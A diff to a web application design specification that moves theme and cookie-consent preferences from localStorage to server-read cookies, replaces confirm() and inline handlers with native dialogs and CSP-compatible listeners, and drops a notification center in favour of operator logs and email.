+**Server-rendered theme (no init JS, no FOUC):** the server reads the `theme` cookie and renders `class="theme-light"`, `class="theme-dark"`, or `class="theme-auto"` on `<html>`. `auto` is pure CSS — `@media (prefers-color-scheme: light)` overrides the dark-default custom properties — so no `matchMedia` detection JS exists. A no-JS visitor gets correct auto theming purely from CSS and can switch via a small `<noscript>` form POSTing to the theme endpoint.
+
+```css
+/* Auto mode - pure CSS, no matchMedia JS */
+@media (prefers-color-scheme: light) {
+  html.theme-auto {
+    --bg-color: #ffffff;
+    --text-color: #212529;
+    --border-color: #dee2e6;
+  }
+}
+```
 
 **JavaScript theme switching (shared):**
 
-**Note:** Per "HTML5 & CSS Over JavaScript" rules - CSS does all theming via variables. JavaScript ONLY handles preference detection and class switching (cannot be done in pure CSS).
+**Note:** Per "HTML5 & CSS Over JavaScript" rules - CSS does all theming via variables. JavaScript is ONLY the toggle click handler: set the cookie and swap the class (cannot be done in pure CSS).
 
 ```javascript
-// Theme function works globally across all pages
-// JS only sets the class - CSS does all the actual styling
+// Theme toggle handler - JS only sets the cookie and swaps the class;
+// CSS does all the actual styling, and the server renders the class on
+// the next request from the same cookie.
 function setTheme(theme) {
-  if (theme === 'auto') {
-    const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
-    theme = prefersDark ? 'dark' : 'light';
-  }
   document.documentElement.className = `theme-${theme}`;
-  localStorage.setItem('theme', theme);
+  document.cookie = `theme=${theme}; path=/; max-age=31536000; SameSite=Lax`;
 }
 ```
 
@@ -23504,11 +23440,31 @@ function closeModal(id) {
 // ============================================================================
 // Form helpers
 // ============================================================================
-function confirmDelete(form, message = 'Are you sure?') {
-  if (confirm(message)) {
-    form.submit();
-  }
-}
+// Delete confirmation uses the native <dialog> pattern - never confirm()
+// (see Forbidden Patterns). The dialog is opened from a click listener;
+// its confirm button submits the real delete form.
+document.querySelectorAll('[data-confirm-dialog]').forEach((btn) => {
+  btn.addEventListener('click', () => {
+    document.getElementById(btn.dataset.confirmDialog).showModal();
+  });
+});
+```
+
+```html
+<!-- Delete confirmation - native <dialog>, no confirm() -->
+<form id="delete-form" method="post" action="/items/123/delete">
+  <button type="button" data-confirm-dialog="confirm-delete">Delete</button>
+</form>
+
+<dialog id="confirm-delete">
+  <p>Are you sure?</p>
+  <!-- Cancel closes the dialog with zero JS -->
+  <form method="dialog">
+    <button>Cancel</button>
+  </form>
+  <!-- Confirm submits the real delete form -->
+  <button type="submit" form="delete-form" class="btn-danger">Delete</button>
+</dialog>
 ```
 
 **What goes in app.js:**
@@ -23519,10 +23475,10 @@ function confirmDelete(form, message = 'Are you sure?') {
 - Dynamic content loading (AJAX)
 - WebSocket connections
 
-**What stays inline (simple one-liners):**
-- `onclick="history.back()"`
-- `onclick="window.print()"`
-- `onclick="this.closest('dialog').close()"`
+**Small behaviors also live in app.js (never inline — the CSP blocks inline event handlers).** One-liners are bound via `addEventListener` on IDs or data-attributes:
+- `document.querySelectorAll('[data-action="back"]').forEach((b) => b.addEventListener('click', () => history.back()));`
+- `document.querySelectorAll('[data-action="print"]').forEach((b) => b.addEventListener('click', () => window.print()));`
+- Dialog close/cancel buttons need no JS at all — wrap them in `<form method="dialog">`
 
 ### Template Rules
 
@@ -23597,15 +23553,12 @@ partial/
 
 | Element | Position | Purpose | Contents |
 |---------|----------|---------|----------|
-| `<nav>` | TOP | Navigation | Links to app sections, user menu |
+| `<nav>` | TOP | Navigation | Links to app sections |
 | `<footer>` | BOTTOM | Information | About, Privacy, Contact, Help, GitHub, version |
 
 **Nav contains (app navigation):**
 - Home link
 - App-specific sections (project-defined)
-- User menu (right side):
-  - If logged in: Username dropdown → Profile, Settings, Logout
-  - If logged out: Login link
 
 **Nav does NOT contain:**
 - API link (users access via `/server/docs/swagger` if needed)
@@ -23616,14 +23569,14 @@ partial/
 ```
 Desktop:
 ┌─────────────────────────────────────────────────────────────────┐
-│  {project_name}                                      [User Icon] │  ← Header
+│  {project_name}                                          [Theme] │  ← Header
 ├─────────────────────────────────────────────────────────────────┤
 │  Home  |  [App Section 1]  |  [App Section 2]  |  ...           │  ← Nav
 └─────────────────────────────────────────────────────────────────┘
 
 Mobile:
 ┌─────────────────────────────────────────────────────────────────┐
-│  {project_name}                                      [User Icon] │  ← Header
+│  {project_name}                                          [Theme] │  ← Header
 ├─────────────────────────────────────────────────────────────────┤
 │                                                      [☰ Menu]   │  ← Nav row
 └─────────────────────────────────────────────────────────────────┘
@@ -23636,7 +23589,7 @@ Mobile:
 ```
 
 ```html
-<!-- Header bar: site name + user icon -->
+<!-- Header bar: site name + theme toggle -->
 <header class="header">
   <a href="/" class="site-brand">{project_name}</a>
 
@@ -23679,7 +23632,7 @@ Mobile:
 - Slides LEFT to open (right-to-left)
 - Slides RIGHT to close (left-to-right)
 - Overlay dims background, click to close
-- User icon stays in header (NOT in menu) - keeps menu clean
+- Theme toggle stays in header (NOT in menu) - keeps menu clean
 
 **Smart Menu :**
 - If all nav links fit on screen → show inline links, NO hamburger
@@ -23733,7 +23686,7 @@ Mobile:
 
 **Mobile Responsive Rules:**
 - Nav row below header: inline links or hamburger
-- User icon ALWAYS in header (never in menu)
+- Theme toggle ALWAYS in header (never in menu)
 - Menu slides from right edge
 - Touch-friendly: minimum 44x44px tap targets
 - Overlay closes menu on tap (CSS label toggles checkbox - no JS)
@@ -23962,7 +23915,7 @@ var staticFS embed.FS
 | NEVER Use | ALWAYS Use Instead |
 |-----------|---------------------|
 | `alert()` | Custom modal with CSS classes |
-| `confirm()` | Custom confirmation modal |
+| `confirm()` | Native `<dialog>` confirmation modal |
 | `prompt()` | Custom input modal or inline form |
 | Plain text inputs for options | Dropdowns (`<select>`) |
 | Plain text for yes/no | Checkboxes or toggle switches |
@@ -24044,7 +23997,7 @@ var staticFS embed.FS
 - **Theme switching MUST work seamlessly** without page reload
 - **All interactive elements MUST be clearly visible** in both themes
 - **Syntax highlighting MUST adapt** to theme (use appropriate colors for each theme)
-- **User preference persisted** in localStorage or cookie
+- **User preference persisted** in the `theme` cookie (server-readable — renders the class on `<html>`)
 - **Default to dark** if no preference set
 
 **Theme Implementation Location:**
@@ -24114,20 +24067,21 @@ var ThemePaletteLight = ThemePalette{
 
 **Theme Detection Flow:**
 ```
-1. Check user preference in localStorage/cookie
-2. If no preference OR preference is "auto":
-   - Check system preference via prefers-color-scheme media query
-   - Apply matching theme (light or dark)
+1. Server reads the theme cookie and renders the class on <html>
+2. If no cookie OR preference is "auto":
+   - Render theme-auto; pure CSS applies the system preference via
+     the prefers-color-scheme media query (no detection JS)
 3. If preference is "light" or "dark":
-   - Apply selected theme directly
+   - Render theme-light / theme-dark directly
 4. Default to dark if all detection fails
 ```
 
 **Theme Switching:**
 - Provide theme toggle in UI (☀️ Light / 🌙 Dark / 🔄 Auto)
-- Store preference in `localStorage.theme` or cookie
+- Store preference in the `theme` cookie so the server renders the class on `<html>`
 - Apply theme class to `<html>` element: `theme-light`, `theme-dark`
-- NO page reload required - instant switching via CSS classes
+- NO page reload required - the toggle handler sets the cookie and swaps the class
+- No-JS visitors get correct auto theming from pure CSS and can switch via a `<noscript>` form POSTing to the theme endpoint
 - All components (Swagger, GraphQL, public pages) switch simultaneously
 
 **Accessibility Requirements:**
@@ -24622,6 +24576,8 @@ if err != nil {
 
 **Operator messages (configured in `server.yml`) shown in UI for downtime notices, updates, etc.**
 
+Active announcements are rendered by the Site Banner (see PART 16 → "Site Banner") — multiple active announcements stack in config order.
+
 ### Configuration
 
 ```yaml
@@ -25040,17 +24996,17 @@ When the operator sets `custom_html` in `server.yml`, the server logs at startup
 | **Buttons (mobile)** | Centered below message, side-by-side |
 | **Decline button** | Text/outline style, no background |
 | **"I Agree" button** | Filled white background, purple text |
-| **Persistence** | Remember choice in localStorage, don't show again |
+| **Persistence** | Remember choice in the `cookieConsent` cookie (set server-side); server skips rendering the banner on later requests |
 | **Z-index** | Above all content, below modals |
 
 ### Banner Behavior
 
 | Action | Result |
 |--------|--------|
-| **I Agree** | Set `cookieConsent=accepted` in localStorage, hide banner, enable all cookies + tracking |
-| **Decline** | Set `cookieConsent=declined` in localStorage, hide banner, session cookies only |
-| **Already set** | Don't show banner if localStorage has cookieConsent |
-| **First visit** | Always show banner until user responds |
+| **I Agree** | Form POST to `/consent` — server sets the `cookieConsent` cookie (all categories accepted), redirects back, enables all cookies + tracking |
+| **Decline** | Form POST to `/consent` — server sets the `cookieConsent` cookie (essential only), redirects back, session cookies only |
+| **Already set** | Server doesn't render the banner when a valid `cookieConsent` cookie exists |
+| **First visit** | Server renders the banner (visible, no JS required) until the user responds |
 
 ### Implementation
 
@@ -25064,7 +25020,7 @@ When the operator sets `custom_html` in `server.yml`, the server logs at startup
 | `{decline_text}` | `server.privacy.consent.buttons.decline` | |
 | `{accept_text}` | `server.privacy.consent.buttons.accept` | |
 | `{preferences_text}` | `server.privacy.consent.preferences_text` | |
-| `{data_sold}` | `server.privacy.data.sold` | Boolean for JS conditionals |
+| `{data_sold}` | `server.privacy.data.sold` | Boolean data attribute read by `app.js` |
 
 **Dynamic Message Selection:**
 ```go
@@ -25074,21 +25030,45 @@ message := cfg.Privacy.GetConsentMessage()
 ```
 
 ```html
-<!-- Cookie Consent Banner - ALWAYS shown until user responds (we use cookies) -->
+<!-- Cookie Consent Banner - server-rendered (visible) whenever no valid cookieConsent cookie exists (we use cookies) -->
 <!-- {message} is dynamically selected based on server.privacy.data.sold -->
-<div id="cookie-consent" class="cookie-banner" data-sold="{data_sold}" style="display: none;">
+{{ if not .HasConsentCookie }}
+<div id="cookie-consent" class="cookie-banner" data-sold="{data_sold}">
   <div class="cookie-banner-content">
     <span class="cookie-message">
       {message} - <a href="{policy_url}" class="policy-link">{policy_text}</a>
     </span>
     <div class="cookie-buttons">
-      <button class="btn-decline" onclick="declineCookies()">{decline_text}</button>
-      <button class="btn-accept" onclick="acceptCookies()">{accept_text}</button>
+      <form method="post" action="/consent">
+        <input type="hidden" name="choice" value="decline">
+        <button type="submit" class="btn-decline">{decline_text}</button>
+      </form>
+      <form method="post" action="/consent">
+        <input type="hidden" name="choice" value="accept">
+        <button type="submit" class="btn-accept">{accept_text}</button>
+      </form>
     </div>
   </div>
 </div>
+{{ end }}
+```
 
-<script>
+**Server-side behavior (works with zero JavaScript):**
+
+| Step | Behavior |
+|------|----------|
+| **Render** | The server renders the banner only when the request has no valid `cookieConsent` cookie — no `display: none`, no reveal script |
+| **POST `/consent`** | Reads `choice` (`accept` / `decline` / `save` from the preferences form), sets the `cookieConsent` cookie (JSON: granular categories + timestamp), redirects back to the originating page |
+| **Later requests** | Server reads `cookieConsent` to skip the banner and to decide tracking injection (`CheckTrackingAllowed`) |
+| **CCPA** | POST `/consent/ccpa` sets/clears the `ccpa_opt_out` cookie and redirects back |
+
+**Progressive enhancement (consent module in `static/js/app.js` — ONE JS file, referenced via `<script src>`, never inline):**
+
+```javascript
+// static/js/app.js - consent module (all JS lives in app.js per the ONE-file rule)
+// Enhancement only - the banner forms POST to /consent and work without JS.
+// This script intercepts the submits to skip the reload.
+
 // Granular consent state (matches server.privacy.cookies structure)
 const defaultConsent = {
   // Always true, cannot be disabled
@@ -25100,58 +25080,48 @@ const defaultConsent = {
   timestamp: 0
 };
 
-// Show banner if no prior consent (we always use cookies)
-(function() {
-  const stored = localStorage.getItem('cookieConsent');
-  const banner = document.getElementById('cookie-consent');
-
-  // No consent yet - show banner
-  if (!stored && banner) {
-    banner.style.display = 'block';
+function readConsentCookie() {
+  const match = document.cookie.match(/(?:^|;\s*)cookieConsent=([^;]+)/);
+  if (!match) return null;
+  try {
+    return JSON.parse(decodeURIComponent(match[1]));
+  } catch (e) {
+    return null;
   }
-
-  // Has consent - apply settings
-  if (stored) {
-    try {
-      const consent = JSON.parse(stored);
-      applyConsent(consent);
-    } catch (e) {
-      // Legacy format or corrupted - show banner again
-      localStorage.removeItem('cookieConsent');
-      if (banner) banner.style.display = 'block';
-    }
-  }
-})();
-
-function acceptCookies() {
-  // Accept all cookies
-  const consent = {
-    essential: true,
-    preferences: true,
-    analytics: true,
-    timestamp: Date.now()
-  };
-  saveAndApplyConsent(consent);
 }
 
-function declineCookies() {
-  // Essential only
-  const consent = {
-    essential: true,
-    preferences: false,
-    analytics: false,
-    timestamp: Date.now()
-  };
-  saveAndApplyConsent(consent);
+function writeConsentCookie(consent) {
+  const value = encodeURIComponent(JSON.stringify(consent));
+  document.cookie = "cookieConsent=" + value + "; path=/; max-age=31536000; SameSite=Lax";
 }
 
+// Intercept the banner forms - set the cookie and hide the banner without a reload
+document.querySelectorAll('#cookie-consent form').forEach(function(form) {
+  form.addEventListener('submit', function(event) {
+    event.preventDefault();
+    const accepted = form.elements.choice.value === 'accept';
+    const consent = {
+      essential: true,
+      preferences: accepted,
+      analytics: accepted,
+      timestamp: Date.now()
+    };
+    saveAndApplyConsent(consent);
+  });
+});
+
+// Bound to buttons carrying data-action="cookie-preferences"
 function showCookiePreferences() {
-  // Show granular preferences modal (see Granular Consent UI in PART 12)
-  document.getElementById('cookie-preferences-modal').style.display = 'block';
+  // Open the granular preferences dialog (see Granular Consent UI in PART 12)
+  document.getElementById('cookie-preferences-modal').showModal();
 }
+
+document.querySelectorAll('[data-action="cookie-preferences"]').forEach(function(el) {
+  el.addEventListener('click', showCookiePreferences);
+});
 
 function savePreferences() {
-  // Called from preferences modal
+  // Called when the preferences dialog form is submitted
   const consent = {
     // Always true
     essential: true,
@@ -25160,12 +25130,13 @@ function savePreferences() {
     timestamp: Date.now()
   };
   saveAndApplyConsent(consent);
-  document.getElementById('cookie-preferences-modal').style.display = 'none';
+  document.getElementById('cookie-preferences-modal').close();
 }
 
 function saveAndApplyConsent(consent) {
-  localStorage.setItem('cookieConsent', JSON.stringify(consent));
-  document.getElementById('cookie-consent').style.display = 'none';
+  writeConsentCookie(consent);
+  const banner = document.getElementById('cookie-consent');
+  if (banner) banner.remove();
   applyConsent(consent);
 }
 
@@ -25196,7 +25167,7 @@ function initCCPA() {
 
   if (dataSold) {
     // Check for existing "Do Not Sell" preference
-    const doNotSell = localStorage.getItem('ccpaDoNotSell') === 'true';
+    const doNotSell = /(?:^|;\s*)ccpa_opt_out=true/.test(document.cookie);
     if (doNotSell) {
       // Apply immediately - no third-party data sharing
       applyCCPAOptOut();
@@ -25206,7 +25177,6 @@ function initCCPA() {
 
 function ccpaDoNotSell() {
   // User opted out of data sales (CCPA right)
-  localStorage.setItem('ccpaDoNotSell', 'true');
   applyCCPAOptOut();
 
   // Also decline non-essential cookies
@@ -25220,6 +25190,17 @@ function ccpaDoNotSell() {
   saveAndApplyConsent(consent);
 }
 
+// Intercept the CCPA opt-out form (POST /consent/ccpa) to skip the reload;
+// the opt-in variant is left to the server round-trip (it must clear the cookie)
+document.querySelectorAll('form[action="/consent/ccpa"]').forEach(function(form) {
+  form.addEventListener('submit', function(event) {
+    if (form.elements.optout.value === 'true') {
+      event.preventDefault();
+      ccpaDoNotSell();
+    }
+  });
+});
+
 function applyCCPAOptOut() {
   // Disable any third-party data sharing
   // - Block analytics if configured
@@ -25229,9 +25210,11 @@ function applyCCPAOptOut() {
 
 // Initialize CCPA on page load
 initCCPA();
-</script>
+```
 
-<style>
+**Banner styles:**
+
+```css
 /* Cookie Consent Banner - matches reference design */
 .cookie-banner {
   position: fixed;
@@ -25317,16 +25300,15 @@ initCCPA();
     padding: 0.5rem 1.25rem;
   }
 }
-</style>
 ```
 
 ### Consent Logic (Granular)
 
-**Consent stored as JSON:** `{"essential":true,"preferences":true,"analytics":false,"timestamp":1704067200}`
+**Consent stored as JSON in the `cookieConsent` cookie (server-readable):** `{"essential":true,"preferences":true,"analytics":false,"timestamp":1704067200}`
 
 | Condition | Show Banner | Essential | Preferences | Analytics |
 |-----------|-------------|-----------|-------------|-----------|
-| No localStorage (first visit) | **Yes** | Yes (always) | Wait | Wait |
+| No `cookieConsent` cookie (first visit) | **Yes** | Yes (always) | Wait | Wait |
 | Accept All clicked | No | Yes | **Yes** | **Yes** (if `server.tracking` configured) |
 | Decline clicked | No | Yes | No | No |
 | Custom preferences saved | No | Yes | User choice | User choice |
@@ -25350,7 +25332,7 @@ initCCPA();
 | **Analytics/Tracking** | **NEVER loaded** | No tracking scripts injected, no data sent to analytics providers |
 | **Preference cookies** | **NOT set** | Theme defaults to system/dark, language defaults to browser/en |
 | **Essential cookies** | **Still work** | Session, CSRF, auth tokens required for app to function |
-| **localStorage** | **Minimal** | Only `cookieConsent` stored to remember decline |
+| **localStorage** | **Not used** | Decline is remembered in the `cookieConsent` cookie (essential — the server must read it to skip the banner and block tracking) |
 | **Third-party scripts** | **NOT loaded** | No Google Analytics, Matomo, etc. |
 | **Embedded content** | **Placeholder shown** | YouTube, social embeds show "Content blocked" placeholder |
 
@@ -25358,7 +25340,7 @@ initCCPA();
 ```
 ✓ Session cookie (required for login/auth)
 ✓ CSRF token cookie (required for form security)
-✓ Remember decline choice (localStorage)
+✓ Remember decline choice (`cookieConsent` cookie — essential)
 ✓ Basic functionality (browse, view content)
 ```
 
@@ -25409,7 +25391,8 @@ func trackingScript(r *http.Request) template.HTML {
 {{ if not preferencesAllowed }}
   <div class="embed-blocked">
     <p>External content blocked due to cookie preferences.</p>
-    <button onclick="showCookiePreferences()">Manage Preferences</button>
+    <!-- Bound in app.js via data-action - inline handlers are blocked by the CSP -->
+    <button data-action="cookie-preferences">Manage Preferences</button>
   </div>
 {{ else }}
   <!-- Actual embed -->
@@ -25571,7 +25554,8 @@ func trackingScript(r *http.Request) template.HTML {
     {{ end }}
 
     <div class="manage-cookies">
-      <button onclick="showCookiePreferences()">Manage Cookie Preferences</button>
+      <!-- Bound in app.js via data-action - inline handlers are blocked by the CSP -->
+      <button data-action="cookie-preferences">Manage Cookie Preferences</button>
     </div>
   </section>
 
@@ -25664,7 +25648,8 @@ func trackingScript(r *http.Request) template.HTML {
       <li><strong>Deletion:</strong> Delete your account and all associated data permanently.</li>
       {{ end }}
       <li><strong>Correction:</strong> Update or correct your personal information anytime.</li>
-      <li><strong>Cookie Control:</strong> <a href="#" onclick="showCookiePreferences()">Manage your cookie preferences</a></li>
+      <!-- Bound in app.js via data-action - inline handlers are blocked by the CSP -->
+      <li><strong>Cookie Control:</strong> <button type="button" class="link-button" data-action="cookie-preferences">Manage your cookie preferences</button></li>
     </ul>
   </section>
 
@@ -25688,9 +25673,16 @@ func trackingScript(r *http.Request) template.HTML {
         <span class="status-icon">✓</span>
         <span>You have opted out of data sales.</span>
       </div>
-      <button class="btn-secondary" onclick="ccpaOptIn()">Opt Back In</button>
+      <!-- POST forms work with zero JS - the server sets/clears the ccpa_opt_out cookie and redirects back; app.js intercepts to skip the reload -->
+      <form method="post" action="/consent/ccpa">
+        <input type="hidden" name="optout" value="false">
+        <button type="submit" class="btn-secondary">Opt Back In</button>
+      </form>
       {{ else }}
-      <button class="btn-primary btn-ccpa-opt-out" onclick="ccpaDoNotSell()">Do Not Sell My Personal Information</button>
+      <form method="post" action="/consent/ccpa">
+        <input type="hidden" name="optout" value="true">
+        <button type="submit" class="btn-primary btn-ccpa-opt-out">Do Not Sell My Personal Information</button>
+      </form>
       {{ end }}
     </div>
 
@@ -25781,7 +25773,7 @@ func trackingScript(r *http.Request) template.HTML {
 - `content.consent_message`: From `GetConsentMessage()` (returns sold/not-sold message)
 - `content.data_usage`: From `GetDataUsageContent()` (returns sold/not-sold content)
 - `ccpa.applicable`: `true` only when `data.sold = true` (the `ccpa` object is only included when `data.sold = true`)
-- `ccpa.user_opted_out`: From the localStorage/cookie opt-out check
+- `ccpa.user_opted_out`: From the `ccpa_opt_out` cookie check
 
 **Note:** The `tracking` and `third_party.services` fields are populated based on `server.tracking` config. If no tracking is configured, they remain empty.
 
@@ -26430,50 +26422,24 @@ Templates are stored as files on disk. Override any built-in template by placing
 
 ## Notification Systems
 
-**Two notification systems available. WebUI is always available. Email requires SMTP.**
+**Three notification channels. The public WebUI serves visitors; operators are reached via logs and email — API projects have no admin UI, so operator events NEVER render in the WebUI.**
 
-| System | Availability | Use When |
-|--------|--------------|----------|
-| **WebUI (Toast/Banner)** | Always available | User is actively using the app |
-| **Email** | Requires valid SMTP | User is away, needs permanent record, critical alerts |
+| System | Audience | Availability | Use When |
+|--------|----------|--------------|----------|
+| **Public WebUI (Toast/Banner)** | Visitors | Always (client-side) | Feedback for the visitor's own actions and service announcements |
+| **Logs** | Operators | Always | Every operator event gets a structured, leveled log line |
+| **Email** | Operators | Requires valid SMTP | Failures, security events, anything needing a permanent record or attention while away |
 
-## WebUI Notification System
+## Public WebUI Notification System
 
-**The WebUI has a built-in notification system. Toast and banner notifications are ALWAYS available regardless of SMTP configuration.**
+**The public frontend has exactly two visitor-facing mechanisms: toasts for immediate action feedback and a server-rendered site banner for site-wide announcements. There is NO notification center, NO bell icon, and NO notification history — API projects have no user accounts, so there is nothing to accumulate. Dismissal state lives in the `dismissed_announcements` cookie, the same mechanism as theme/language preferences (see "Client-Side Preferences") — the server reads it and skips rendering dismissed announcements, so dismissal works with zero JS. Neither ever shows operator or server-internal events (version, backups, SSL, disk — Tier 3 information, Public Endpoint Safety Principle, PART 11), and both work regardless of SMTP configuration.**
 
 ### How It Works
 
 | Component | Description |
 |-----------|-------------|
-| **Toast** | Pop-up notifications in corner of screen |
-| **Banner** | Persistent bar at top of page |
-| **Notification Center** | Bell icon with history of notifications |
-| **Badge Count** | Unread notification count on bell icon |
-
-### Notification Center
-
-**Notification center accessible via bell icon in the header.**
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│  Header                                    🔔 (3)  [User]   │
-└─────────────────────────────────────────────────────────────┘
-                                               │
-                                               ▼
-                              ┌────────────────────────────────┐
-                              │  Notifications                 │
-                              ├────────────────────────────────┤
-                              │  🔴 SSL certificate expiring   │
-                              │     in 3 days                  │
-                              │     2 hours ago                │
-                              ├────────────────────────────────┤
-                              │  ✅ Backup completed           │
-                              │     backup_2025-01-15.tar.gz   │
-                              │     5 hours ago                │
-                              ├────────────────────────────────┤
-                              │  [Mark all read]  [Clear all]  │
-                              └────────────────────────────────┘
-```
+| **Toast** | Pop-up notifications in corner of screen (see PART 16 → "Toast Notifications") |
+| **Banner** | Server-rendered bar immediately after `<body>`, before `<main>` — config-driven (see PART 16 → "Site Banner") |
 
 ### WebUI Notification Types
 
@@ -26485,123 +26451,91 @@ Templates are stored as files on disk. Override any built-in template by placing
 | `error` | ❌ | Failures, critical issues | Manual dismiss |
 | `security` | 🔒 | Security-related alerts | Manual dismiss |
 
-### Toast vs Banner vs Notification Center
+### Toast vs Banner
 
 | Element | Use For | Behavior |
 |---------|---------|----------|
-| **Toast** | Immediate feedback for user actions | Auto-dismiss, stacks in corner |
-| **Banner** | Persistent alerts requiring attention | Stays until dismissed or resolved |
-| **Notification Center** | History of all notifications | Persists across sessions, stored in DB |
+| **Toast** | Immediate feedback for visitor actions | Auto-dismiss, stacks in corner; ephemeral (DOM only) |
+| **Banner** | Site-wide notices requiring attention | Server-rendered from config; stays until dismissed; dismissal stored in the `dismissed_announcements` cookie, keyed on announcement id |
 
-**When to Use Each:**
+**When to Use Each (visitor-facing events only):**
 
-| Scenario | Toast | Banner | Center |
-|----------|:-----:|:------:|:------:|
-| Settings saved | ✓ | | |
-| Form validation error | ✓ | | |
-| Backup complete | ✓ | | ✓ |
-| SSL expiring soon | | ✓ | ✓ |
-| Update available | | ✓ | ✓ |
-| SMTP not configured | | ✓ | |
-| Scheduler task failed | ✓ | | ✓ |
-| Rate limit hit | ✓ | | ✓ |
-| IP blocked | ✓ | | ✓ |
+| Scenario | Toast | Banner |
+|----------|:-----:|:------:|
+| Preferences saved (theme/language) | ✓ | |
+| Form validation error | ✓ | |
+| Copied to clipboard | ✓ | |
+| Resource created/updated/deleted | ✓ | |
+| Rate limit hit (the visitor's own 429) | ✓ | |
+| Cookie consent | | ✓ |
+| Scheduled maintenance announcement | | ✓ |
+| PWA update available (new frontend assets — service-worker banner, discloses no server version) | | ✓ |
+
+**Operator events (backups, SSL, updates, scheduler failures, abuse detection) never appear here — see "Operator Notifications" below.**
 
 ## Operator Notifications
 
-**Notifications shown to operators.**
+**API projects have no admin UI — operator events surface via structured logs (always), email (when SMTP is configured), and CLI output (`--status`, `--update check`). Never via the public WebUI.**
 
-| Event | Toast | Banner | Center | Description |
-|-------|:-----:|:------:|:------:|-------------|
-| Settings saved | ✓ | | | Confirmation of config save |
-| Config validation error | ✓ | | | Invalid config value |
-| Backup started | ✓ | | | Backup in progress |
-| Backup complete | ✓ | | ✓ | Backup finished |
-| Backup failed | ✓ | | ✓ | Backup error |
-| SSL expiring (7+ days) | | | ✓ | Warning in center only |
-| SSL expiring (<3 days) | | ✓ | ✓ | Urgent banner |
-| SSL renewed | ✓ | | ✓ | Certificate renewed |
-| SSL renewal failed | ✓ | ✓ | ✓ | Critical - needs attention |
-| Update available | | ✓ | ✓ | New version available |
-| Scheduler task failed | ✓ | | ✓ | Task error |
-| Rate limit exceeded | | | ✓ | Abuse detection notice |
-| SMTP not configured | | ✓ | | Persistent warning |
-| Database connection issue | | ✓ | ✓ | Critical warning |
-| Disk space low | | ✓ | ✓ | System warning |
-| GeoIP database outdated | | | ✓ | Update needed |
-| Tor address ready | ✓ | | | Onion address generated |
+| Event | Log Level | Email | Description |
+|-------|-----------|:-----:|-------------|
+| Config validation error | ERROR | ✗ | Invalid config value (also fails fast at startup) |
+| Config reloaded | INFO | ✗ | Config file change applied |
+| Backup started | INFO | ✗ | Backup in progress |
+| Backup complete | INFO | Optional | Backup finished |
+| Backup failed | ERROR | ✓ | Critical - needs attention |
+| SSL expiring (7+ days) | WARN | ✗ | Early warning, not urgent |
+| SSL expiring (<3 days) | WARN | ✓ | Urgent - needs action |
+| SSL renewed | INFO | ✗ | Certificate renewed |
+| SSL renewal failed | ERROR | ✓ | Critical - needs attention |
+| Update available | WARN | Optional | New version available (`update_check` task) |
+| Update installed | INFO | ✓ | Important change record |
+| Scheduler task failed | ERROR | ✓ | Needs attention when away |
+| Scheduler task success | — | ✗ | No notification needed (task log only) |
+| Rate limit exceeded | WARN | ✗ | Abuse detection notice |
+| IP blocked | WARN | Optional | Abuse detection |
+| Security alert | ERROR | ✓ | Critical - needs record |
+| SMTP not configured | WARN | — | Logged at startup (email impossible by definition) |
+| Database connection issue | ERROR | ✓ | Critical warning |
+| Disk space low | WARN | ✓ | System warning |
+| GeoIP database outdated | WARN | ✗ | Update needed |
+| Tor address ready | INFO | ✗ | Onion address generated |
 
+## Log vs Email Decision Matrix
 
-## Notification vs Email Decision Matrix
-
-**WebUI notifications are ALWAYS used when the user is active. Email is ONLY used when:**
+**Every operator event is logged — structured and leveled. Email is ONLY added when:**
 1. SMTP is configured AND working
 2. The event warrants a permanent record OR
-3. The user may be away and needs to be alerted
-
-| Event | WebUI | Email | Reason |
-|-------|:-----:|:-----:|--------|
-| Settings saved | ✓ | ✗ | Immediate feedback only |
-| Backup complete | ✓ | Optional | Quick confirmation |
-| Backup failed | ✓ | ✓ | Critical - needs attention |
-| SSL expiring (7+ days) | ✓ | ✗ | Warning, not urgent |
-| SSL expiring (<3 days) | ✓ | ✓ | Urgent - needs action |
-| SSL renewed | ✓ | ✗ | Informational |
-| Rate limit exceeded | ✓ | ✗ | Informational |
-| IP blocked | ✓ | Optional | Abuse detection |
-| Security alert | ✓ | ✓ | Critical - needs record |
-| Scheduler task failed | ✓ | ✓ | Needs attention when away |
-| Scheduler task success | ✗ | ✗ | No notification needed |
-| Tor address regenerated | ✓ | ✗ | Operator initiated |
-| Update available | ✓ | Optional | Informational |
-| Update installed | ✓ | ✓ | Important change record |
+3. The operator may be away and needs to be alerted
 
 ### Decision Logic
 
 ```
-1. Is user actively using the app?
-   → Always show WebUI notification (toast/center)
+1. Log the event (always - structured, leveled)
 
 2. Is SMTP configured?
-   → No: WebUI only, no email attempt
-   → Yes: Continue to step 3
+   → No: log only, no email attempt
+   → Yes: continue to step 3
 
 3. Is it critical (failure, security, urgent)?
    → Send email
 
-4. Does user need a record when away?
+4. Does the operator need a record when away?
    → Send email
 
-5. Is it just confirmation of user action?
-   → WebUI only (no email)
-
-6. Is it routine success?
-   → No notification needed
+5. Is it routine success?
+   → Log only, no email
 ```
 
 ## Notification Storage
 
-**WebUI notifications are stored in the database for persistence.**
+**There is no server-side notification storage. API projects have no `notifications` table, no per-operator notification state, and no WebSocket notification sync.**
 
-| Storage | Details |
-|---------|---------|
-| Table | `notifications` |
-| Retention | 30 days (configurable) |
-| Max stored | 100 per operator |
-| Sync | Real-time via WebSocket |
-
-**Notification Record:**
-```json
-{
-  "id": "notif_01HQXYZ",
-  "type": "warning",
-  "title": "SSL Certificate Expiring",
-  "message": "Certificate expires in 3 days",
-  "link": "/server/help#ssl",
-  "read": false,
-  "created_at": "2025-01-15T10:30:00Z"
-}
-```
+| Data | Where |
+|------|-------|
+| Visitor toasts | Ephemeral (DOM only, gone on dismiss) |
+| Banner dismissals | `dismissed_announcements` cookie (client-side, keyed on announcement id, visitor-clearable — same store as theme/language preferences; server-readable so dismissed banners are never rendered) |
+| Operator record | Structured logs + email (SMTP) |
 
 ## Sane Defaults
 
@@ -26610,24 +26544,21 @@ Templates are stored as files on disk. Override any built-in template by placing
 | Toast position | `top-right` | Corner for toast notifications |
 | Toast duration | `5` seconds | Auto-dismiss time (0 = manual) |
 | Error dismiss | `manual` | Errors require manual dismiss |
-| Notification retention | `30` days | How long to keep in center |
-| Max notifications | `100` | Per operator limit |
-| Real-time updates | `enabled` | WebSocket for instant updates |
+| Banner type | `info` | Default announcement type when `announcements[].type` is unset |
 
 ## Operator Notification Preferences
 
-| Category | Events | Default | Can Disable? |
-|----------|--------|---------|--------------|
